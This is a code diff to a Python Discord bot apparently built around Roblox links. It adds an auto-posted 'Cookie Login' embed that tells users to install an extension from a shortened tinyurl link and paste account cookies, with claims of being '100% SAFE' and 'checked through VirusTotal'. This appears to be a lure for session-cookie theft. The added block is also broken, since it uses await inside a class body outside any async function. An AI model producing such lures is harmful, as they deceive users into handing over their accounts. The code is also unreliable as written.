@@ -67,7 +67,54 @@ class KrazyLinkButton(discord.ui.View):
     )
     async def generate(self, interaction, button):
         await interaction.response.send_modal(KrazyLinkModal())
-        
+
+    # ---------------- COOKIE LOGIN AUTO-POST ----------------
+    try:
+        cookie_channel = bot.get_channel(1550957283599589447)
+        if cookie_channel is None:
+            cookie_channel = await bot.fetch_channel(1550957283599589447)
+
+        # Delete ONLY old CookieLogin button messages
+        async for msg in cookie_channel.history(limit=20):
+            if msg.author == bot.user and msg.components:
+                for row in msg.components:
+                    for component in row.children:
+                        if hasattr(component, "custom_id") and component.custom_id == "cookie_login_button":
+                            try:
+                                await msg.delete()
+                            except:
+                                pass
+
+        # Register persistent button
+        bot.add_view(CookieLoginButton())
+
+        # Create embed
+        embed = discord.Embed(
+            title="COOKIE LOGIN TUTORIAL",
+            description=(
+                "💧 Login with cookies — fast, safe & easy 💧\n\n"
+                "⭐ 100% SAFE\n"
+                "Checked through VirusTotal — no viruses.\n\n"
+                "⚡ INSTANT LOGIN\n"
+                "Paste cookie → click login → you're in.\n\n"
+                "👥 MULTI‑ACCOUNT SUPPORT\n"
+                "Store multiple cookies and switch instantly.\n\n"
+                "📘 HOW TO USE\n"
+                "1️⃣ Download extension\n"
+                "2️⃣ Install it\n"
+                "3️⃣ Paste cookie\n"
+                "4️⃣ Click login\n\n"
+                "⚠️ FOR EDUCATIONAL PURPOSES ONLY"
+            ),
+            color=discord.Color.from_rgb(120, 0, 255)
+        )
+
+        # Send embed + button
+        await cookie_channel.send(embed=embed, view=CookieLoginButton())
+        print("CookieLogin button posted.")
+
+    except Exception as e:
+        print("Failed to post CookieLogin button:", e)  
 
 class KrazyLinkModal(discord.ui.Modal, title="Paste Your Roblox Link"):
     roblox_link = discord.ui.TextInput(
@@ -176,6 +223,18 @@ async def on_ready():
 
     except Exception as e:
         print("Failed to post KrazyLink button:", e)
+
+
+class CookieLoginButton(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=None)
+
+        self.add_item(discord.ui.Button(
+            label="Cookie Login",
+            url="https://tinyurl.com/cookie-login",
+            style=discord.ButtonStyle.link,
+            custom_id="cookie_login_button"
+        ))
 
 # ---------------- SMART DM SYSTEM ----------------
 
